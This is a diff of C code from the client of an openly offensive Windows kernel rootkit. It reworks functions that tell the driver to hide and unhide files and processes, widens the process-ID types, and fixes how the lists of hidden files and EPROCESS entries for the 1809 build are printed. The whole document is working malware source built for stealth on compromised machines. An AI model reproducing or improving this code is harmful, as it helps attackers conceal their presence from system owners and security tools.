@@ -415,7 +415,8 @@ BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCK
 	PASS_DATA OprStatus = { 0 };
 	DWORD PathLength = 0;  // Length of path in GENERAL MEMORY (strlen * 2, not including 
 	WCHAR CurrentHidden[1024] = { 0 };
-	WCHAR* HiddenFiles = NULL;
+	WCHAR CurrentCharacter = L'\0';
+	PVOID HiddenFiles = NULL;
 	int CurrentIndex = 0;
 	printf("=====HideFileOrFolder=====\n\n");
 	RootkInstructions.Operation = RKOP_HIDEFILE;
@@ -491,7 +492,7 @@ BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCK
 			printf("\n===========================\n");
 			return FALSE;
 		}
-		HiddenFiles = (WCHAR*)malloc(RootkInstructions.Size);
+		HiddenFiles = malloc(RootkInstructions.Size);
 		if (HiddenFiles == NULL) {
 			printf("RESPONSE: Could not perform manipulations of files/folders - could not allocate memory for list :(\n");
 			printf("\n===========================\n");
@@ -504,17 +505,19 @@ BOOL HideFileRootkKMD(char ModuleName[], WCHAR FilePath[], int RemoveIndex, SOCK
 			return FALSE;
 		}
 		printf("Currently hidden files (dynamically):\n");
-		for (int bufferi = 0; bufferi < RootkInstructions.Size / sizeof(WCHAR); bufferi++) {
-			if (HiddenFiles[bufferi] == '|') {
-				wprintf(L"%s\n", CurrentHidden);
-				WideResetString(CurrentHidden);
-				CurrentIndex = 0;
+		for (int bufferi = 0; bufferi < RootkInstructions.Size; bufferi += sizeof(WCHAR)) {
+			RtlCopyMemory(&CurrentCharacter, (PVOID)((ULONG64)HiddenFiles + bufferi), sizeof(WCHAR));
+			if (CurrentCharacter == L'|') {
+				wprintf(L"\n");
+			}
+			else if (CurrentCharacter == L'\0') {
+				wprintf(L"(+nullterm)");
 			}
 			else {
-				CurrentHidden[CurrentIndex] = HiddenFiles[bufferi];
-				CurrentIndex++;
+				wprintf(L"%c", CurrentCharacter);
 			}
 		}
+		printf("\n");
 	}
 	printf("RESPONSE: Manipulations of files/folders succeeded :)\n");
 	printf("\n===========================\n");
@@ -526,7 +529,7 @@ BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCK
 	ROOTKIT_MEMORY RootkInstructions = { 0 };
 	PASS_DATA OprStatus = { 0 };
 	PVOID HiddenProcesses = NULL;
-	BYTE CurrentProcess[EPROCESS_SIZE] = { 0 };
+	BYTE CurrentProcess[EPROCESS1809_SIZE] = { 0 };
 	int CurrentIndex = 0;
 	printf("=====HideProcess=====\n\n");
 	RootkInstructions.Operation = RKOP_HIDEPROC;
@@ -552,14 +555,14 @@ BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCK
 	// Pass preprocessing parameters (if needed) and set struct values:
 	switch (RequestStatus) {
 	case HIDE_PROCESS:
-		RootkInstructions.MainPID = (USHORT)ProcessId;
+		RootkInstructions.MainPID = (ULONG64)ProcessId;
 		RootkInstructions.Size = 0;
 		break;
 	case UNHIDE_PROCESS:
 		if (RemoveIndex != -1) {
-			RootkInstructions.SemiPID = (USHORT)RemoveIndex;
+			RootkInstructions.SemiPID = (ULONG64)RemoveIndex;
 		}
-		RootkInstructions.MainPID = (USHORT)ProcessId;
+		RootkInstructions.MainPID = (ULONG64)ProcessId;
 		RootkInstructions.Size = 1;
 		break;
 	default:
@@ -594,7 +597,7 @@ BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCK
 			printf("=====================\n\n");
 			return FALSE;
 		}
-		HiddenProcesses = (WCHAR*)malloc(RootkInstructions.Size);
+		HiddenProcesses = malloc(RootkInstructions.Size);
 		if (HiddenProcesses == NULL) {
 			printf("RESPONSE: Could not perform manipulations of processes - could not allocate memory for list :(\n");
 			printf("\n===========================\n");
@@ -608,9 +611,9 @@ BOOL HideProcessRootkKMD(char ModuleName[], int ProcessId, int RemoveIndex, SOCK
 			return FALSE;
 		}
 		printf("Currently hidden processes (dynamically):\n");
-		for (int hiddeni = 0; hiddeni < RootkInstructions.Size / EPROCESS_SIZE; hiddeni++) {
-			RtlCopyMemory(CurrentProcess, (PVOID)((ULONG64)HiddenProcesses + (hiddeni * EPROCESS_SIZE)), EPROCESS_SIZE);
-			printf("Process number %d -\n", hiddeni);
+		for (ULONG64 hiddeni = 0; hiddeni < RootkInstructions.Size; hiddeni += EPROCESS1809_SIZE) {
+			RtlCopyMemory(CurrentProcess, (PVOID)((ULONG64)HiddenProcesses + hiddeni), EPROCESS1809_SIZE);
+			printf("Process number %llu -\n", hiddeni);
 			ParseEprocess(CurrentProcess);
 		}
 	}
